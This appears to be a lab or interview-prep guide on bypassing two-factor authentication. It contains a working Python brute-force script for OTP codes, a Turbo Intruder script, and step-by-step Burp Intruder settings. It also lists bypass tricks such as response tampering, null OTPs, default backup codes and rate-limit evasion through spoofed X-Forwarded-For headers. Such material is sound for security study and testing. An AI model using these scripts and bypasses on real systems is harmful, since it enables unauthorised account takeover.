# Challenge 8: 2FA Bypass Using Brute Force Attack

> **Difficulty:** 🟢 EASY | **Success Ratio:** 100%
> **Goal:** Bypass two-factor authentication by brute-forcing the OTP code.

---

## What They Test

Can you bypass a 2FA/MFA implementation that uses a short numeric OTP without proper rate limiting?

---

## Key Concept

2FA adds an extra layer of security by requiring a second factor (usually a time-based OTP). However, if the OTP is:
- **Short** (4-6 digits = only 10,000 to 1,000,000 possibilities)
- **No rate limiting** (unlimited attempts allowed)
- **Long validity window** (OTP doesn't expire quickly)

Then it can be **brute-forced**.

---

## Methodology

### Step 1: Login with Valid Credentials

```
1. Login with known/found username and password
2. Application should redirect to 2FA/OTP page
3. If you don't have credentials, find them first:
   - Default credentials
   - SQL injection bypass
   - Check source code for hardcoded passwords
```

### Step 2: Analyze the OTP Request

```
1. Enter any OTP (like 1234) and submit
2. Capture the request in Burp Suite
3. Note:
   - URL: POST /verify-otp
   - OTP parameter name: otp=1234 or code=1234 or token=1234
   - Session/cookie info
   - Any CSRF token
```

### Step 3: Determine OTP Format

| OTP Type | Range         | Total Combinations | Brute Force Time |
| -------- | ------------- | ------------------ | ---------------- |
| 4-digit  | 0000-9999     | 10,000             | ~2-5 minutes     |
| 5-digit  | 00000-99999   | 100,000            | ~20-50 minutes   |
| 6-digit  | 000000-999999 | 1,000,000          | ~3-8 hours       |

### Step 4: Brute Force with Burp Intruder

```
1. Send the OTP request to Intruder (Ctrl+I)

2. Positions Tab:
   - Clear all positions
   - Highlight the OTP value → Add §
   - Example: otp=§1234§

3. Payloads Tab:
   For 4-digit OTP:
   - Payload type: Numbers
   - From: 0
   - To: 9999
   - Step: 1
   - Min integer digits: 4
   - Max integer digits: 4

   For 6-digit OTP:
   - From: 0
   - To: 999999
   - Step: 1
   - Min integer digits: 6
   - Max integer digits: 6

4. Options Tab:
   - Number of threads: 20-50 (increase for speed)
   - Follow redirections: Always
   - Grep - Match: Add "success", "dashboard", "welcome"

5. Start Attack
   - Sort by Status Code or Length
   - Different response = correct OTP
```

---

## Handling CSRF Tokens (If Present)

If each OTP submission requires a fresh CSRF token:

### Burp Macro Approach
```
1. Project Options → Sessions → Session Handling Rules → Add
2. Rule Actions:
   a. Add → "Run a macro"
   b. Record macro: GET request to the OTP page
   c. Configure macro:
      - In "Configure macro item" → Extract from response
      - Parameter name: csrf_token
      - Extract from: the HTML form
   d. In Session Handling Action:
      - "Update parameters" → derive from macro response
3. Scope: Set to target URL
4. Now Intruder will automatically get fresh CSRF token per request
```

### Python Script Approach
```python
import requests
from bs4 import BeautifulSoup

url_otp_page = "http://target.com/verify-otp"
session = requests.Session()

# Login first
session.post("http://target.com/login", data={
    "username": "admin",
    "password": "password123"
})

for otp in range(0, 10000):
    otp_str = str(otp).zfill(4)  # Pad with zeros: 0001, 0002, etc.
    
    # Get fresh CSRF token
    resp = session.get(url_otp_page)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf_token"})
    csrf_token = csrf["value"] if csrf else ""
    
    # Submit OTP
    resp = session.post(url_otp_page, data={
        "otp": otp_str,
        "csrf_token": csrf_token
    })
    
    if "invalid" not in resp.text.lower() and "wrong" not in resp.text.lower():
        print(f"[+] FOUND OTP: {otp_str}")
        print(f"[+] Response: {resp.text[:200]}")
        break
    
    if otp % 100 == 0:
        print(f"[-] Tried {otp} OTPs...")

print("Done!")
```

---

## Turbo Intruder (For Faster Brute Force)

```python
# Burp Extension: Turbo Intruder
# Right-click request → Extensions → Turbo Intruder → Send to Turbo Intruder

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=True)
    
    for otp in range(0, 10000):
        otp_str = str(otp).zfill(4)
        engine.queue(target.req, otp_str)

def handleResponse(req, interesting):
    if req.status == 302:  # Redirect = success
        table.add(req)
    if "dashboard" in req.response.lower():
        table.add(req)
```

---

## Other 2FA Bypass Techniques (Beyond Brute Force)

### 1. Skip 2FA Page Entirely
```
After login, instead of going to /verify-otp:
1. Directly navigate to /dashboard or /home
2. Some apps only check 2FA on the 2FA page
3. If you go to a different URL, you're already authenticated
```

### 2. Response Manipulation
```
1. Submit wrong OTP
2. Intercept the response in Burp
3. Change:
   {"success": false, "message": "Invalid OTP"}
   →
   {"success": true, "message": "Verified"}
4. Or change HTTP status from 401 → 200
```

### 3. Null/Empty OTP
```
# Try submitting empty value
otp=
otp=null
otp=undefined
otp=0
otp=000000

# Try removing the OTP parameter entirely from the request
```

### 4. Reuse OTP
```
# If the OTP doesn't get invalidated after use:
1. Request OTP for your account
2. Note the OTP
3. Logout, login as target user
4. Use YOUR OTP on THEIR account
```

### 5. Check OTP in Response
```
# Some poorly implemented apps return the OTP:
# In the response body
# In a cookie
# In a custom header
# In a JavaScript variable on the page

1. Submit request → check FULL response in Burp
2. Search for: the actual OTP value, "code", "otp", "token"
```

### 6. Backup Codes
```
# Check if default backup codes exist
# Common default backup codes: 12345678, 00000000
# Check documentation for test accounts

# Try common backup code values:
backup_code=12345678
backup_code=00000000
recovery_code=test
```

### 7. OTP from Previous Session
```
# OTP generated in one session might work in another
1. Start login as user A → receive OTP → note it
2. Start new session → login as user A
3. Try the old OTP → might still be valid
```

### 8. Rate Limit Bypass
```
If rate limiting exists, try:
1. Add X-Forwarded-For header with different IPs
   X-Forwarded-For: 1.2.3.4
   X-Forwarded-For: 1.2.3.5
   (change per request)

2. Slow down requests to stay under rate limit

3. Try different API endpoints:
   /api/v1/verify-otp
   /api/v2/verify-otp
   /api/verify-otp
   /mobile/verify-otp

4. Use different user-agent strings
```

---

## Quick Decision Tree

```
2FA Page Appears
├── Try navigating directly to /dashboard → works? → DONE
├── Check response for OTP value → found? → USE IT
├── Try empty/null OTP → accepted? → DONE
├── Try response manipulation → bypass? → DONE
├── Check for rate limiting:
│   ├── No rate limiting → BRUTE FORCE with Intruder
│   └── Rate limiting exists → Try bypass headers → BRUTE FORCE
└── Try backup codes → work? → DONE
```

---

## Tips for the Interview

1. **Check for rate limiting first** — submit 5-10 OTPs quickly and see if you get blocked
2. **Use 4-digit padded numbers** — OTP `7` should be sent as `0007`, not `7`
3. **Try skipping the 2FA page first** — it's the quickest check
4. **Monitor response length in Intruder** — correct OTP will have different length
5. **If there's a CSRF token**, set up a Burp Macro to handle it automatically
6. **Brute forcing 4-digit OTP takes only minutes** — don't be afraid to try it
